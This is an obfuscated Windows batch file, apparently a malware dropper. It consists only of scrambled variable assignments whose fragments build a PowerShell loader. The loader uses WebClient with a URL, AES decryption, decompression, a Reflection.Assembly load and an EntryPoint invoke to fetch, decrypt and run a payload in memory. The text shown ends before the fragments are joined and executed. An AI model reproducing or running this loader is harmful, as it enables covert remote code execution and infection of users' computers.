@echo off
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "RxKoBwyDvn=cryp"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "vugYNYSugj=aes_"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "UTshlzTNVA=tor("
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "ofpBejElwi=_var"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "PFthZTYhDH=ChQ="
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "bjRxFVKnRr=y()}"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "upGaZlJxwN=eam("
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "tFFZJUPGvl=.Inv"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "IupeMXswus=emor"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "bsczoMoiYF=;$ae"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "bhIxdRxYPa=BXfC"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "ElRICSUvOb=};fu"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "tcxibSuLiU=nsfo"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "qhswpPZuuJ=ebcl"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "PKPDjinrhn=comp"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "dsrJlOtIbZ=1FrA"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "DMGjYWPnVu=ipSt"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "XkAindfkVk=,'/'"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "nTNdTEsrxN=ct S"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "hjoiWcdxAL=yloa"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "tWaGuREEFK==dec"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "VyXNZZdlTx=Dl.E"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "isbUVyFNbF=e_fu"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "dAjIErUJXe=var="
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "GDbZhLEuvl=ispo"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "BVtlzgjiiR=Clie"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "EakPvXygCW=New-"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "jxWPoRaRDd=ring"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "VTIleafKGI=ctio"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "ekRXuUIyZO=se()"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "RguZBPItUk=unct"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "wlTORyZgcD=yTo("
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "PXhEfgElUs=lace"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "ZpqBqbIxZD=load"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "vFSWIgnUtN=kgy,"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "tJvKFdJpir=r,$p"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "sSkeOHsdBG=Comp"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "DnWCmCrUzA=echo"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "PHVmznEjib=ing("
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "GtOmoRuXnv=,$pa"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "tVIfQuRoHB=aes_"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "pnpmfnzzgP=t Sy"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "auqJKbDZPu=','A"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "WkCopmnVMX=($pa"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "jQlfJNvrwl=mpre"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "sKIlNZbhEU==[Sy"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "GFavCDlrEE=xamp"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "sgKsTofhfL=s_va"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "rnjTXAegxg=turn"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "EygimJUvOl=lock"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "YqTOdIOjln=m_va"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "lADxAobolG=nver"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "jCMHutSFTE=yvkw"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "FLDTjTQZnx=AEmq"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "nDEXJfxHKa=A'))"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "gafcAUDEDK=ream"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "MoUTfrXDlZ=);ex"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "UNJZApytTH=n (d"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "oVZHMGvMVj=;$vK"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "PeEzwrDndE=2_va"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "UtKZSpOoxo=om/p"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "GhtdUNSgUM=embl"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "qkGidtBUGd=([Co"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "SMDrvpoRbS=ject"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "PmgPfTilvK=294j"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "MwAIYDyILG=epla"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "uodTqVYrSh=Syst"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "wblDMkdJiy= "%systemdrive%"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "NgNkuUkBFN=K71L"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "pdtjDIIGhz=ity."
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "WYjIQEJRim=ient"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "OIWntPsmLI=O.Co"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "MyhXJCIpnO=.Web"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "FsNROubedR=m.Co"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "sRoRnwpUYi=[Sys"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "HIpLXeEASy=$kpE"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "rIUIJsOoeB=var)"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "OOkKtWlqWD=y=Ne"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "QFjwpfUbyI=Tikg"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "mxwrkevJqA=tem3"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "LcBqgyWHQb=$pay"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "FBEVDqKARR=gth)"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "rEahaIASuI=ode]"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "qaIrsORATm=Poin"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "wazGGNzPwl=);$r"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "jaJLOMOJRY=nt_v"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "BEGTizzGUI=cryp"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "jwjRQYeLDM=4=')"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "UJEmVpgEQA=]]('%*'"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "cfTLgAyWfu=Obje"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "yUtVFCKlWQ=i.Sp"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "GIlPQIGQmU=ion."
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "fNvWtTxazL=\Sys"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "LIfCIUtxdi==');"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "ldygHCSWbI=ress"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "czkMhQmWyx=-Obj"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "bDovkaEuKd=pEZN"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "wrLJBGBRMu=);$k"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "MvZyuBoROy=cryp"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "GXHKTzIumj=$pay"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "GlOOfbdGyw=);$a"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "pEjdijvqXD=\Win"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "xPIEdLmhWR=.Mem"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "GQVQyQkDho=t]::"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "eEybQFcqPN=();$"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "VshOaItsvn=ctio"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "uPueQeJBeP=var."
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "PbDQfFCjDR=te_f"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "CJLEJOrfAx=From"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "ZUEUYrErFK=$url"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "BLwnRoXoCo=nver"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "zzxWHTwhOf=ll;e"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "geXoRIZNUy=y=[S"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "yQZmzwUGMy=ding"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "hxvmYyIBZY=($pa"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "hojZgJUEwK=m.IO"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "BDPCEJplcR=pose"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "heHNhCjehn=::De"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "OAQmFhJHXu=0,$p"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "CJdJxBJEmw='0WE"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "KirOfDkGZG=ZN.D"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "BJVvogSDAh=_var"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "WFkfzpgiKZ=Mode"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "NXJqzgnuWY=romB"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "gPMcGsOSAD=ar.P"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "ADXlofwBqf=ecom"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "KSaXLVWECF=.Ass"
!esDSBijIrWmjGfEyGaIGYZEWTXIFwaOzssTpYXhLZeQtQuBXDX! "rcgjppFKZl=var,"
